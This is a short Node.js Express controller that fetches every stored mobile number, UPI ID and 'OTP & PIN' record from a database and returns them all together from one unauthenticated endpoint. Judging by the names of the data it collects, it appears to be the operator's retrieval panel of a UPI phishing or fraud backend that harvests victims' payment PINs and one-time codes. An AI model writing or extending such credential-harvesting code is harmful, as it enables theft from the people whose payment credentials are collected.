const dotenv=require("dotenv")
const MobileModel = require("../Model/mobile.model")
const { UpiModel } = require("../Model/upi.model")
const OtpModel = require("../Model/otp.model")
dotenv.config()



const UserAllData=async(req,res)=>{
    try
    {
        const totalNumber=await MobileModel.find()
        const totalUpiID=await UpiModel.find()
        const OTPPIN=await OtpModel.find()
        
        if(!totalNumber.length>0){
            return res.status(404).json({ message: "No Number Found" })
        }

        if(!totalUpiID.length>0){
            return res.status(404).json({ message: "No Upi Found" })
        }
        
        if(!OTPPIN.length>0){
            return res.status(404).json({ message: "No Otp & Pin Found" })
        }

        res.status(200).json({message:"Get All Details",totalNumber,totalUpiID,OTPPIN})
    }
    
    catch(error)
    {
        return res.status(404).json({ message:error })
    }

}


module.exports={UserAllData}